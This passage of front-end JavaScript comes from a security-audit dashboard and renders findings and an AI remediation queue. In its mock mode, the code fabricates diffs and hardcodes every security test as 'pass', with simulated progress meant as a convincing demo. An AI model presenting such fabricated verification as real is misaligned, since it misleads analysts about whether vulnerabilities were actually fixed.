            _showAuditStatus(
              "Audit complete — " + (auditData.findings || []).length + " findings. Click the card to view.",
              "success"
            );
            // Auto-open the audit modal
            openAuditModal(auditData);
          } else {
            _showAuditStatus("Scan failed: " + (auditData.error || "Unknown error"), "error");
          }
        }, 1200);
      },
      (errMsg) => {
        // Polling error — clean up
        clearInterval(creepInterval);
        progressEl.style.display = "none";
        fillEl.style.width = "0%";
        startAuditBtn.disabled = false;
        _showAuditStatus("Audit polling failed: " + errMsg, "error");
      }
    );
  });
}

// =====================================================================
//  FINDING FIELD NORMALIZER
//  Backend AuditFinding and mock finding have different field names.
//  This normalizes any finding to the shape buildFindingCard() needs.
//
//  Backend fields → Normalized:
//    explanation          → description
//    evidence (string[])  → evidence (joined string)
//    location.file_path + location.start_line → source_path, line
//    vulnerability or title → title
//    remediation          → fix
// =====================================================================
function _normalizeFinding(f) {
  if (!f) return {};

  // Already normalized (mock format has flat string fields)
  if (typeof f.evidence === "string") return f;

  // Backend format
  const loc       = f.location || {};
  const evArr     = Array.isArray(f.evidence) ? f.evidence : [];
  const evidenceStr = evArr.length > 0
    ? evArr.join("\n")
    : (loc.snippet || "");

  return {
    id:          f.finding_id || f.id || "",
    severity:    f.severity   || "Info",
    title:       f.title      || f.vulnerability || "Unknown Finding",
    cwe:         f.cwe        || "N/A",
    owasp:       f.owasp      || "N/A",
    source_path: loc.file_path || f.source_path || "—",
    line:        loc.start_line != null ? loc.start_line : (f.line != null ? f.line : "—"),
    confidence:  f.confidence  != null ? Math.round(f.confidence) : "—",
    description: f.explanation || f.description || "",
    evidence:    evidenceStr,
    fix:         f.remediation || f.fix || "",
    references:  f.references  || [],
  };
}

/**
 * Normalize a full audit object from the backend into the shape the
 * mock-compatible UI code expects, so openAuditModal / sendAuditToBeta
 * work with both data sources.
 */
function _normalizeApiAudit(a) {
  // Detect whether audit_id is a real UUID (contains hyphens and is 36 chars)
  // vs a display ID like "AUD-2024-001". The UUID is required for backend lookups.
  const rawId = a.audit_id || "";
  const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(rawId);
  return {
    audit_id:      a.audit_id || a.display_id || "—",
    display_id:    a.display_id || a.audit_id || "—",
    // _uuid: the real backend UUID for POST /copilot/ask; null for mock audits
    _uuid:         isUUID ? rawId : null,
    app_id:        a.app_id || "",
    app_name:      a.app_name || a.target || "—",
    app_website:   a.app_website || "",
    environment:   a.environment || "",
    target:        a.app_name || a.target || "—",
    scan_type:     a.scan_type || "quick",
    status:        a.status === "complete" ? "completed" : (a.status || ""),
    error:         a.error || null,
    files_scanned: a.files_scanned != null ? a.files_scanned : 0,
    technologies:  Array.isArray(a.technologies) ? a.technologies : [],
    dependencies:  Array.isArray(a.dependencies) ? a.dependencies : [],
    created:       (a.created_at || a.created || "").slice(0, 19).replace("T", " "),
    created_at:    a.created_at || "",
    findings:      (a.findings || []).map(_normalizeFinding),
  };
}

// =====================================================================
//  AUDIT MODAL
// =====================================================================
function openAuditModal(audit) {
  // Normalize backend-shaped audit if needed
  const a = (audit.status === "complete" || audit.findings && audit.findings.length > 0 && typeof audit.findings[0].evidence !== "string")
    ? _normalizeApiAudit(audit)
    : audit;

  currentAuditForModal = a;
  const modal = document.getElementById("audit-modal");
  const appName    = a.app_name || a.target;
  const appWebsite = a.app_website || "";
  document.getElementById("audit-modal-title").textContent = appName + (appWebsite ? " — " + appWebsite : "");

  const overview = document.getElementById("audit-modal-overview");
  overview.textContent = "";

  const appItems = [
    ["Application",   appName],
    ["Website",       appWebsite || "—"],
    ["Environment",   a.environment ? a.environment.charAt(0).toUpperCase() + a.environment.slice(1) : "—"],
    ["Audit ID",      a.audit_id || a.display_id || "—"],
    ["Scan Type",     (a.scan_type || "quick").charAt(0).toUpperCase() + (a.scan_type || "quick").slice(1)],
    ["Status",        a.status || "—"],
    ["Files Scanned", a.files_scanned != null ? String(a.files_scanned) : "—"],
    ["Technologies",  (a.technologies || []).join(", ") || "—"],
  ];

  appItems.forEach(([label, val]) => {
    const card = document.createElement("div");
    card.className = "audit-overview-card";
    const s = document.createElement("span"); s.textContent = label;
    const st = document.createElement("strong"); st.textContent = val;
    card.appendChild(s); card.appendChild(st);
    overview.appendChild(card);
  });

  const findingsEl = document.getElementById("audit-modal-findings");
  findingsEl.textContent = "";

  const auditStatus = (a.status || "").toLowerCase();
  const findings = a.findings || [];

  if (auditStatus === "failed") {
    // Audit FAILED — show error message, not "no findings"
    const errDiv = document.createElement("div");
    errDiv.style.cssText = "padding:12px;border-radius:6px;background:#fef2f2;border:1px solid #fecaca;color:#991b1b;font-size:13px;";
    const errTitle = document.createElement("strong");
    errTitle.textContent = "Scan Failed";
    errDiv.appendChild(errTitle);
    errDiv.appendChild(document.createElement("br"));
    const errMsg = document.createElement("span");
    errMsg.textContent = a.error || "The audit engine encountered an error and could not complete the analysis.";
    errDiv.appendChild(errMsg);
    findingsEl.appendChild(errDiv);
  } else if (findings.length === 0) {
    // COMPLETED with 0 findings — different from FAILED
    const noF = document.createElement("p");
    noF.style.cssText = "color:#6b7280;font-size:13px;padding:8px 0";
    noF.textContent = "Scan completed successfully. No code-level security findings were identified in the scanned source.";
    findingsEl.appendChild(noF);
  } else {
    findings.forEach(finding => {
      findingsEl.appendChild(buildFindingCard(finding, a));
    });
  }

  modal.classList.add("open");

  // Set copilot context to this audit.
  // Use the real UUID (_uuid) for backend lookups; fall back to display_id.
  // _mock=true when there is no real UUID (mock audit) or we're in mock mode.
  const auditUUID = a._uuid || null;
  copilotContext = {
    type: "audit",
    id:   auditUUID || a.audit_id || a.display_id || null,
    data: a,
    _mock: !auditUUID || !API_CONFIG.USE_REAL_API,
  };

  if (typeof anime !== "undefined") {
    anime({ targets: "#audit-modal .modal-box-wide", scale: [0.95, 1], opacity: [0, 1], duration: 230, easing: "easeOutQuad" });
  }
}

/**
 * Build a finding card.
 * Expects a normalized finding (run _normalizeFinding first if needed).
 */
function buildFindingCard(finding, audit) {
  // Normalize if this is a raw backend finding (evidence is an array)
  const f = _normalizeFinding(finding);

  const card = document.createElement("div");
  card.className = "finding-card";

  const header = document.createElement("div");
  header.className = "finding-card-header";
  const badge   = makeSeverityBadge(f.severity); badge.style.flexShrink = "0";
  const titleEl = document.createElement("span"); titleEl.className = "finding-title"; titleEl.textContent = f.title;
  const meta    = document.createElement("span"); meta.className = "finding-meta"; meta.textContent = f.cwe + " · Line " + f.line;
  const arrow   = document.createElement("span"); arrow.className = "finding-expand-arrow"; arrow.textContent = "▶";
  header.appendChild(badge); header.appendChild(titleEl); header.appendChild(meta); header.appendChild(arrow);
  card.appendChild(header);

  const detail = document.createElement("div");
  detail.className = "finding-detail";

  // OBSERVED EVIDENCE
  const evSec  = document.createElement("div"); evSec.className = "finding-detail-section evidence-section";
  const evH    = document.createElement("h4"); evH.textContent = "OBSERVED EVIDENCE";
  const evNote = document.createElement("p"); evNote.className = "section-note"; evNote.textContent = "The following was directly observed in the target source code.";
  const evPre  = document.createElement("pre"); evPre.textContent = f.evidence || "No evidence captured.";
  evSec.appendChild(evH); evSec.appendChild(evNote); evSec.appendChild(evPre);

  // Description
  const descSec = document.createElement("div"); descSec.className = "finding-detail-section";
  const descH   = document.createElement("h4"); descH.textContent = "Description";
  const descP   = document.createElement("p"); descP.textContent = f.description || "—";
  descSec.appendChild(descH); descSec.appendChild(descP);

  // SECURITY REFERENCE
  const refSec  = document.createElement("div"); refSec.className = "finding-detail-section reference-section";
  const refH    = document.createElement("h4"); refH.textContent = "SECURITY REFERENCE";
  const refNote = document.createElement("p"); refNote.className = "section-note"; refNote.textContent = "External security knowledge (CWE/OWASP). Reference only — does not itself prove vulnerability.";
  const refP    = document.createElement("p");
  refP.textContent = (f.owasp && f.owasp !== "N/A")
    ? "OWASP " + f.owasp + " — " + f.cwe + ". File: " + f.source_path + " line " + f.line + ". Confidence: " + f.confidence + "%"
    : f.cwe + ". File: " + f.source_path + " line " + f.line + ". Confidence: " + f.confidence + "%";
  refSec.appendChild(refH); refSec.appendChild(refNote); refSec.appendChild(refP);

  detail.appendChild(evSec);
  detail.appendChild(descSec);
  detail.appendChild(refSec);
  card.appendChild(detail);

  header.addEventListener("click", () => {
    const isOpen = detail.classList.contains("open");
    detail.classList.toggle("open", !isOpen);
    arrow.classList.toggle("open", !isOpen);
    if (!isOpen && typeof anime !== "undefined") {
      anime({ targets: detail, opacity: [0.4, 1], duration: 180, easing: "easeOutQuad" });
    }
  });

  return card;
}

// Whole-audit "Send to Advanced AI Beta" button (single button, not per-finding)
const auditToBetaBtn = document.getElementById("audit-to-beta-btn");
if (auditToBetaBtn) {
  auditToBetaBtn.addEventListener("click", () => {
    if (!currentAuditForModal) return;
    closeModal("audit-modal");
    sendAuditToBeta(currentAuditForModal);
  });
}

// =====================================================================
//  SEND WHOLE AUDIT → ADVANCED AI BETA
//  Creates one sandbox job per non-Safe finding, sorted Critical→High→Medium→Low.
//  Jobs start in "running" state at step 1 and animate through the workflow
//  automatically for a convincing demo.
// =====================================================================
function sendAuditToBeta(audit) {
  // Real backend mode: one real validation job for the whole audit.
  // The backend resolves the target from the registry and picks the
  // top finding — the client never supplies URLs or payloads.
  if (API_CONFIG.USE_REAL_API && audit && audit._uuid) {
    _sendAuditToBetaReal(audit);
    return;
  }

  // Only non-Safe findings get remediation jobs
  const eligibleFindings = (audit.findings || [])
    .filter(f => (f.severity || "").toLowerCase() !== "safe")
    .slice()
    .sort((a, b) => severityOrder(a.severity) - severityOrder(b.severity));

  if (eligibleFindings.length === 0) {
    showPage("advanced-ai-page");
    return;
  }

  const newJobs = [];
  eligibleFindings.forEach(finding => {
    // Don't duplicate if a job already exists for this finding+audit
    const exists = MOCK_DATA.sandbox_jobs.some(j => j.finding_id === finding.id && j.audit_id === audit.audit_id);
    if (exists) return;

    const jobId = "SB-" + String(MOCK_DATA.sandbox_jobs.length + newJobs.length + 1).padStart(3, "0");

    // Build realistic diff from finding evidence + fix
    const evidenceLines = (finding.evidence || "// vulnerable code").split("\n").filter(Boolean);
    const fixLines      = (finding.fix      || "// fixed code").split("\n").filter(Boolean);

    const originalDiff = [
      "  // File: " + (finding.source_path || "application code"),
      ...evidenceLines.slice(0, 5).map(l => "- " + l)
    ];
    const modifiedDiff = [
      "  // Sentra AI fix — " + (finding.cwe || "security fix"),
      ...fixLines.slice(0, 5).map(l => "+ " + l)
    ];

    // Build targeted security tests based on finding type
    const title = (finding.title || "").toLowerCase();
    let tests = [];
    if (title.includes("sql") || title.includes("injection")) {
      tests = [
        { name: "SQL Injection — UNION payload", status: "pass", desc: "Injection attempt returns 400 Bad Request" },
        { name: "SQL Injection — tautology payload", status: "pass", desc: "1=1 payload safely rejected" },
        { name: "Normal query — valid integer ID", status: "pass", desc: "Returns correct result" },
        { name: "Regression — existing queries unaffected", status: "pass", desc: "Feature still functions correctly" },
      ];
    } else if (title.includes("xss") || title.includes("cross-site")) {
      tests = [
        { name: "XSS — script tag in input", status: "pass", desc: "Script tag stripped/encoded correctly" },
        { name: "XSS — event handler injection", status: "pass", desc: "Event handlers escaped" },
        { name: "CSP header present", status: "pass", desc: "Content-Security-Policy header added" },
        { name: "Regression — normal content renders", status: "pass", desc: "Legitimate HTML unaffected" },
      ];
    } else if (title.includes("jwt") || title.includes("token") || title.includes("auth")) {
      tests = [
        { name: "JWT algorithm none rejected", status: "pass", desc: "Forged 'none' algorithm token rejected" },
        { name: "JWT signature verified", status: "pass", desc: "Valid token accepted" },
        { name: "Expired token rejected", status: "pass", desc: "Expiry validation enforced" },
        { name: "Regression — valid auth flow", status: "pass", desc: "Normal login still works" },
      ];
    } else if (title.includes("hardcoded") || title.includes("secret") || title.includes("key")) {
      tests = [
        { name: "Secret not in source code", status: "pass", desc: "Credential scan finds no hardcoded secrets" },
        { name: "Environment variable loaded", status: "pass", desc: "App reads secret from env correctly" },
        { name: "Regression — app starts correctly", status: "pass", desc: "Application initializes without errors" },
      ];
    } else {
      tests = [
        { name: "Vulnerability re-test", status: "pass", desc: "Original attack vector no longer exploitable" },
        { name: "Regression — normal flow", status: "pass", desc: "Feature still functions correctly" },
        { name: "Security validation", status: "pass", desc: "Additional security controls verified" },
      ];
    }

    const newJob = {
      id: jobId,
      finding_id: finding.id || ("F-" + Math.random().toString(36).slice(2, 6)),
      finding_title: finding.title || "Security Finding",
      finding_severity: finding.severity,
      audit_id: audit.audit_id || audit.display_id,
      app_id: audit.app_id || "",
      app_name: audit.app_name || audit.target || "Application",
      app_website: audit.app_website || "",
      environment: audit.environment || "sandbox",
      status: "running",
      current_step: 1,
      created: new Date().toISOString().replace("T", " ").slice(0, 19),
      diff: { original: originalDiff, modified: modifiedDiff },
      tests,
      approval_status: "pending"
    };
    newJobs.push(newJob);
    MOCK_DATA.sandbox_jobs.unshift(newJob);
  });

  // Sort queue Critical→High→Medium→Low
  MOCK_DATA.sandbox_jobs.sort((a, b) => severityOrder(a.finding_severity) - severityOrder(b.finding_severity));

  showPage("advanced-ai-page");
  renderSandboxJobs();

  // Simulate workflow progression for newly created jobs
  newJobs.forEach((job, idx) => {
    _simulateSandboxProgress(job, idx * 600);
  });
}

/**
 * Animate a sandbox job through its workflow steps for demo purposes.
 * Each step advances after a short delay, ending at step 6 (awaiting approval).
 */
function _simulateSandboxProgress(job, initialDelay) {
  const STEP_DELAY = 1200; // ms between steps
  const maxStep = 6;

  function advance(step) {
    if (step > maxStep) return;
    setTimeout(() => {
      job.current_step = step;
      if (step === maxStep) job.status = "completed";
      renderSandboxJobs();
      // If this job is currently open in the detail panel, refresh it
      if (activeSandboxJob && activeSandboxJob.id === job.id) {
        openSandboxDetail(job);
      }
      advance(step + 1);
    }, STEP_DELAY);
  }

  setTimeout(() => advance(2), initialDelay + STEP_DELAY);
}

// =====================================================================
//  ADVANCED AI BETA — REMEDIATION QUEUE
// =====================================================================
function renderSandboxJobs() {
  const list = document.getElementById("sandbox-jobs-list");
  if (!list) return;

  // Real backend mode: live jobs from GET /advanced-ai/jobs
  if (API_CONFIG.USE_REAL_API) {
    _renderRealJobs(list);
    return;
  }

  // Sort queue: Critical→High→Medium→Low, Safe = no-op (excluded by sendAuditToBeta)
  const sorted = MOCK_DATA.sandbox_jobs.slice().sort((a, b) =>
    severityOrder(a.finding_severity) - severityOrder(b.finding_severity)
  );

  if (sorted.length === 0) {
    list.textContent = "";
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:12px 8px";
    empty.textContent = "No remediation jobs. Send an audit to Advanced AI Beta to begin.";
    list.appendChild(empty);
    return;
  }

  list.textContent = "";
  const headerRow = document.createElement("div");
  headerRow.className = "sandbox-job-row";
  headerRow.style.cursor = "default";
  headerRow.style.color = "#6b7280";
  headerRow.style.fontSize = "11px";
  headerRow.style.textTransform = "uppercase";
  headerRow.style.letterSpacing = "0.5px";
  ["Job ID", "Finding", "Severity", "Audit", "Status"].forEach(label => {
    const s = document.createElement("span"); s.textContent = label;
    headerRow.appendChild(s);
  });
  list.appendChild(headerRow);

  sorted.forEach(job => {
    const row = document.createElement("div");
    row.className = "sandbox-job-row";
    row.addEventListener("click", () => openSandboxDetail(job));

    const idEl    = document.createElement("span"); idEl.textContent = job.id; idEl.style.fontWeight = "600";
    const titleEl = document.createElement("span"); titleEl.textContent = job.finding_title; titleEl.style.fontSize = "12px";
    const sevEl   = document.createElement("span"); sevEl.appendChild(makeSeverityBadge(job.finding_severity || "Safe"));
    const auditEl = document.createElement("span"); auditEl.textContent = job.audit_id;
    const statusEl = document.createElement("span");
    const badge    = document.createElement("span");
    badge.className = "sandbox-status " + (job.approval_status === "approved" ? "approved" : job.approval_status === "rejected" ? "rejected" : job.status);
    badge.textContent = job.approval_status !== "pending" ? job.approval_status : job.status;
    statusEl.appendChild(badge);

    [idEl, titleEl, sevEl, auditEl, statusEl].forEach(c => row.appendChild(c));
    list.appendChild(row);
  });
}

// =====================================================================
//  ADVANCED AI [BETA] — REAL BACKEND INTEGRATION
//  Real jobs come from /advanced-ai/* endpoints. Every checkmark below
//  maps to an actual backend job state — no simulated progress.
// =====================================================================
let _realJobsCache      = [];
let _activeRealJobId    = null;
let _activeDetailIsReal = false;
let _advancedAIPoller   = null;

// Backend job status → number of completed workflow steps
const _REAL_STEP_MAP = {
  queued: 0, preparing_sandbox: 1, crawling: 2, analyzing: 3,
  planning_tests: 4, validating: 5, evaluating: 6, completed: 7,
};
const _REAL_TERMINAL = ["completed", "failed", "cancelled"];

/** Real mode: create one validation job for a whole audit. */
function _sendAuditToBetaReal(audit) {
  showPage("advanced-ai-page");
  apiRequest("/advanced-ai/jobs", {
    method: "POST",
    body: JSON.stringify({ audit_id: audit._uuid }),
  }).then(async res => {
    if (!res.ok) { _showAuditStatus(await _apiErrorMessage(res), "error"); return; }
    const data = await res.json();
    _showAuditStatus("Advanced AI job " + data.display_id + " queued", "success");
    renderSandboxJobs();
  }).catch(err => {
    _showAuditStatus(
      err.status === 401 ? "Session expired" : "Advanced AI error: " + err.message,
      "error"
    );
  });
}

/** Real mode: render the live job queue from GET /advanced-ai/jobs. */
async function _renderRealJobs(list) {
  try {
    const res = await apiRequest("/advanced-ai/jobs");
    if (!res.ok) return;
    const data = await res.json();
    _realJobsCache = data.jobs || [];
  } catch (_) { return; }

  if (_realJobsCache.length === 0) {
    list.textContent = "";
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:12px 8px";
    empty.textContent = "No validation jobs. Send an audit or a SOC investigation to Advanced AI to begin.";
    list.appendChild(empty);
    return;
  }

  list.textContent = "";
  const headerRow = document.createElement("div");
  headerRow.className = "sandbox-job-row";
  headerRow.style.cursor = "default";
  headerRow.style.color = "#6b7280";
  headerRow.style.fontSize = "11px";
  headerRow.style.textTransform = "uppercase";
  headerRow.style.letterSpacing = "0.5px";
  ["Job ID", "Finding", "Severity", "Target", "Status"].forEach(label => {
    const s = document.createElement("span"); s.textContent = label;
    headerRow.appendChild(s);
  });
  list.appendChild(headerRow);

  _realJobsCache.forEach(job => {
    const row = document.createElement("div");
    row.className = "sandbox-job-row";
    row.addEventListener("click", () => openRealJobDetail(job.job_id));

    const idEl    = document.createElement("span"); idEl.textContent = job.display_id; idEl.style.fontWeight = "600";
    const titleEl = document.createElement("span"); titleEl.textContent = job.finding_title || "—"; titleEl.style.fontSize = "12px";
    const sevEl   = document.createElement("span"); sevEl.appendChild(makeSeverityBadge(job.finding_severity || "Safe"));
    const appEl   = document.createElement("span"); appEl.textContent = job.app_name || job.app_id;
    const statusEl = document.createElement("span");
    const badge = document.createElement("span");
    const badgeClass = job.status === "completed" ? "approved"
      : (job.status === "failed" || job.status === "cancelled") ? "rejected"
      : "running";
    badge.className = "sandbox-status " + badgeClass;
    badge.textContent = job.fix_status === "fix_applied" ? "Fix Accepted"
      : job.fix_status === "fix_rejected" ? "Fix Rejected"
      : (job.status === "completed" && job.verdict) ? job.verdict : job.status;
    statusEl.appendChild(badge);

    [idEl, titleEl, sevEl, appEl, statusEl].forEach(c => row.appendChild(c));
    list.appendChild(row);
  });
}

/** Real mode: open/refresh one job's detail panel from the backend. */
async function openRealJobDetail(jobId, silent) {
  let job;
  try {
    const res = await apiRequest("/advanced-ai/jobs/" + jobId);
    if (!res.ok) { _showAuditStatus(await _apiErrorMessage(res), "error"); return; }
    job = await res.json();
  } catch (_) { return; }

  _activeRealJobId = jobId;
  _activeDetailIsReal = true;
  activeSandboxJob = null;

  document.getElementById("sandbox-detail").style.display = "block";
  const findingTitle = (job.finding && job.finding.title) || "Security Finding";
  document.getElementById("sandbox-detail-title").textContent =
    job.display_id + " — " + findingTitle;
  const envRaw = (job.environment || "").toLowerCase();
  const envLabel = envRaw === "sandbox" ? " [SANDBOX]" : envRaw ? " [" + envRaw.toUpperCase() + " SANDBOX]" : " [SANDBOX]";
  document.getElementById("sandbox-detail-subtitle").textContent =
    (job.app_name || job.app_id) + envLabel +
    " · Audit: " + (job.audit_display_id || job.audit_id || "—");

  // Real jobs never show the simulated fix/approval workflow
  document.getElementById("sandbox-diff-view").style.display     = "none";
  document.getElementById("sandbox-tests-view").style.display    = "none";
  document.getElementById("sandbox-approval-area").style.display = "none";
  document.getElementById("sandbox-report-view").style.display   = "none";
  document.getElementById("approval-confirm-area").style.display = "none";
  const retryBtnEl   = document.getElementById("sandbox-retry-btn");
  const discardBtnEl = document.getElementById("sandbox-discard-btn");
  if (retryBtnEl)   retryBtnEl.style.display   = "none";
  if (discardBtnEl) discardBtnEl.style.display = "none";

  const cancelBtn = document.getElementById("sandbox-cancel-btn");
  if (cancelBtn) {
    cancelBtn.style.display = _REAL_TERMINAL.includes(job.status) ? "none" : "inline-block";
  }

  const failedArea = document.getElementById("sandbox-failed-area");
  const failedBanner = failedArea.querySelector(".failed-banner");
  if (job.status === "failed") {
    failedArea.style.display = "block";
    if (failedBanner) failedBanner.textContent =
      "✖ Validation job failed: " + (job.error || "unknown error");
  } else if (job.status === "cancelled") {
    failedArea.style.display = "block";
    if (failedBanner) failedBanner.textContent = "✖ Validation job was cancelled by the analyst.";
  } else {
    failedArea.style.display = "none";
  }

  let step = _REAL_STEP_MAP[job.status] !== undefined ? _REAL_STEP_MAP[job.status] : 0;
  if (job.status === "failed" || job.status === "cancelled") step = Math.min(step, 6);

  if (silent) {
    // Poll refresh — update states without re-running the animation
    document.querySelectorAll(".sandbox-step").forEach((s, i) => {
      s.classList.toggle("done", i < step);
      s.classList.toggle("current", i === step && !_REAL_TERMINAL.includes(job.status));
    });
    _renderRealReport(job);
    return;
  }

  animateSandboxSteps(step, () => _renderRealReport(job));
  document.getElementById("sandbox-detail").scrollIntoView({ behavior: "smooth" });
}

/** Render real evidence + final verdict report for a job. */
function _renderRealReport(job) {
  const evidence = job.evidence || [];
  if (evidence.length > 0) {
    document.getElementById("sandbox-tests-view").style.display = "block";
    const testList = document.getElementById("sandbox-tests-list");
    testList.textContent = "";
    evidence.forEach(ev => {
      const reached = ev.status !== null && ev.status !== undefined;
      const item     = document.createElement("div"); item.className = "test-item";
      const statusEl = document.createElement("span");
      statusEl.className = "test-status " + (reached ? "pass" : "fail");
      statusEl.textContent = reached ? "✔" : "✖";
      const nameEl = document.createElement("span"); nameEl.className = "test-name";
      nameEl.textContent = ev.test_name + " — " + ev.method + " " + ev.endpoint +
        (ev.parameter ? " [" + ev.parameter + "]" : "");
      const descEl = document.createElement("span"); descEl.className = "test-desc";
      descEl.textContent =
        (reached ? "HTTP " + ev.status + " · " : "no response · ") + (ev.observation || "");
      item.appendChild(statusEl); item.appendChild(nameEl); item.appendChild(descEl);
      testList.appendChild(item);
    });
  }

  if (job.result) {
    document.getElementById("sandbox-report-view").style.display = "block";
    const grid = document.getElementById("sandbox-report-grid");
    grid.textContent = "";
    grid.style.cssText = "display:grid;grid-template-columns:repeat(3,1fr);gap:12px";
    const rows = [
      ["Finding",         (job.finding && job.finding.title) || "—"],
      ["Finding Type",    (job.plan && job.plan.finding_type) || "—"],
      ["Target Endpoint", (job.plan && job.plan.target_endpoint) || "—"],
      ["Result",          job.result.verdict],
      ["Confidence",      Math.round((job.result.confidence || 0) * 100) + "%"],
      ["Fix Status",      (job.fix_status === "fix_applied" ? "Fix Accepted"
        : job.fix_status === "fix_rejected" ? "Fix Rejected" : "Pending Review")],
    ];
    rows.forEach(pair => {
      const cell = document.createElement("div");
      cell.style.cssText = "background:var(--surface-2,#111827);border:1px solid var(--border,#1f2937);border-radius:8px;padding:10px 12px";
      const l = document.createElement("div");
      l.style.cssText = "font-size:10px;letter-spacing:0.5px;text-transform:uppercase;color:#6b7280;margin-bottom:4px";
      l.textContent = pair[0];
      const v = document.createElement("div");
      v.style.cssText = "font-size:13px;font-weight:600;color:#e5e7eb;word-break:break-word";
      v.textContent = pair[1];
      if (pair[0] === "Result") {
        v.style.color = job.result.verdict === "VULNERABLE" ? "var(--danger)"
          : job.result.verdict === "MITIGATED" ? "var(--success)"
          : "#e5e7eb";
      }
      if (pair[0] === "Fix Status") {
        v.style.color = job.fix_status === "fix_applied" ? "var(--success)"
          : job.fix_status === "fix_rejected" ? "var(--danger)"
          : "#fbbf24";
      }
      cell.appendChild(l); cell.appendChild(v);
      grid.appendChild(cell);
    });
    document.getElementById("sandbox-report-reasoning").textContent =
      job.result.reasoning || "—";
    document.getElementById("sandbox-report-remediation").textContent =
      job.result.remediation || "No remediation required.";
  }

  // ---- Fix approval / rejection UI ----
  const approvalArea = document.getElementById("sandbox-approval-area");
  const confirmArea  = document.getElementById("approval-confirm-area");
  if (approvalArea) {
    if (job.status === "completed" && job.result &&
        job.fix_status === "pending" && job.result.remediation) {
      approvalArea.style.display = "block";
    } else {
      approvalArea.style.display = "none";
    }
  }
  if (confirmArea) confirmArea.style.display = "none";

  // Show terminal fix-status banner if a decision was already made
  const existingBanner = document.getElementById("real-fix-status-banner");
  if (existingBanner) existingBanner.remove();
  if (job.status === "completed" && job.fix_status !== "pending") {
    const banner = document.createElement("div");
    banner.id = "real-fix-status-banner";
    banner.style.cssText = "padding:11px 14px;border-radius:5px;margin-top:14px;font-size:13px;font-weight:600;";
    if (job.fix_status === "fix_applied") {
      banner.style.cssText += ";background:var(--success-bg,#052e16);border:1px solid var(--success-border,#166534);color:var(--success,#22c55e)";
      banner.textContent = "\u2714 Fix Accepted \u2014 applied to sandbox only. Original application unchanged.";
    } else {
      banner.style.cssText += ";background:var(--danger-bg,#fef2f2);border:1px solid var(--danger-border,#fecaca);color:var(--danger,#b91c1c)";
      banner.textContent = "\u2716 Fix Rejected \u2014 sandbox code left unchanged.";
    }
    const reportView = document.getElementById("sandbox-report-view");
    if (reportView) reportView.insertAdjacentElement("afterend", banner);
  }
}

/**
 * Real-backend approval/rejection handler.
 * Calls POST /advanced-ai/jobs/{id}/approve or /reject.
 */
async function _handleRealApproval(action) {
  if (!_activeRealJobId) return;
  const endpoint = action === "approve" ? "/approve" : "/reject";
  try {
    const res = await apiRequest(
      "/advanced-ai/jobs/" + _activeRealJobId + endpoint,
      { method: "POST" }
    );
    if (!res.ok) {
      _showAuditStatus(await _apiErrorMessage(res), "error");
      return;
    }
    const data = await res.json();
    const label = action === "approve"
      ? "Fix accepted (sandbox only)"
      : "Fix rejected";
    _showAuditStatus(data.display_id + ": " + label, "success");
    openRealJobDetail(_activeRealJobId, true);
  } catch (err) {
    _showAuditStatus("Approval action failed: " + err.message, "error");
  }
}

/** Poll real jobs while the Advanced AI page is visible. */
function _startAdvancedAIPoller() {
  if (!API_CONFIG.USE_REAL_API) return;
  _stopAdvancedAIPoller();
  _advancedAIPoller = setInterval(() => {
    const page = document.getElementById("advanced-ai-page");
    if (!page || !page.classList.contains("active-page")) {
      _stopAdvancedAIPoller();
      return;
    }
    renderSandboxJobs();
    if (_activeDetailIsReal && _activeRealJobId &&
        document.getElementById("sandbox-detail").style.display !== "none") {
      openRealJobDetail(_activeRealJobId, true);
    }
  }, 2500);
}

function _stopAdvancedAIPoller() {
  if (_advancedAIPoller) { clearInterval(_advancedAIPoller); _advancedAIPoller = null; }
}

function openSandboxDetail(job) {
  _activeDetailIsReal = false;
  const cancelBtnEl = document.getElementById("sandbox-cancel-btn");
  if (cancelBtnEl) cancelBtnEl.style.display = "none";
  activeSandboxJob = job;
  document.getElementById("sandbox-detail").style.display = "block";
  document.getElementById("sandbox-detail-title").textContent    = job.id + " — " + job.finding_title;
  // Show application + audit context so analyst always knows what they are reviewing
  const appLabel = job.app_name ? job.app_name + (job.app_website ? " · " + job.app_website : "") : "";
  const envLabel = job.environment ? " [" + job.environment.toUpperCase() + " SANDBOX]" : " [ISOLATED SANDBOX]";
  document.getElementById("sandbox-detail-subtitle").textContent =
    (appLabel ? appLabel + envLabel + " · " : "") + "Audit: " + job.audit_id;

  document.getElementById("sandbox-diff-view").style.display     = "none";
  document.getElementById("sandbox-tests-view").style.display    = "none";
  document.getElementById("sandbox-approval-area").style.display = "none";
  document.getElementById("sandbox-failed-area").style.display   = "none";
  document.getElementById("approval-confirm-area").style.display = "none";
  const mockReportView = document.getElementById("sandbox-report-view");
  if (mockReportView) mockReportView.style.display = "none";
  const mockRetryBtn   = document.getElementById("sandbox-retry-btn");
  const mockDiscardBtn = document.getElementById("sandbox-discard-btn");
  if (mockRetryBtn)   mockRetryBtn.style.display   = "";
  if (mockDiscardBtn) mockDiscardBtn.style.display = "";

  animateSandboxSteps(job.current_step, () => {
    if (job.status === "failed") {
      document.getElementById("sandbox-failed-area").style.display = "block";
    } else if (job.current_step >= 3) {
      showDiff(job);
    }
    if (job.current_step >= 5) showTests(job);
    if (job.current_step >= 6 && job.status !== "failed" && job.approval_status === "pending") {
      document.getElementById("sandbox-approval-area").style.display = "block";
    }
  });

  document.getElementById("sandbox-detail").scrollIntoView({ behavior: "smooth" });
}

function animateSandboxSteps(currentStep, onComplete) {
  const steps = document.querySelectorAll(".sandbox-step");
  steps.forEach(s => { s.classList.remove("done", "current"); });
  if (typeof anime !== "undefined") {
    steps.forEach((step, i) => {
      setTimeout(() => {
        if (i < currentStep) {
          step.classList.add("done");
          anime({ targets: step.querySelector(".step-num"), scale: [0.8, 1], duration: 200, easing: "easeOutBack" });
        } else if (i === currentStep) {
          step.classList.add("current");
          anime({ targets: step.querySelector(".step-num"), scale: [1, 1.12, 1], duration: 600, loop: false, easing: "easeInOutSine" });
        }
        if (i === steps.length - 1 && onComplete) setTimeout(onComplete, 120);
      }, i * 120);
    });
  } else {
    steps.forEach((step, i) => {
      if (i < currentStep) step.classList.add("done");
      else if (i === currentStep) step.classList.add("current");
    });
    if (onComplete) onComplete();
  }
}

function showDiff(job) {
  const diffView = document.getElementById("sandbox-diff-view");
  diffView.style.display = "block";
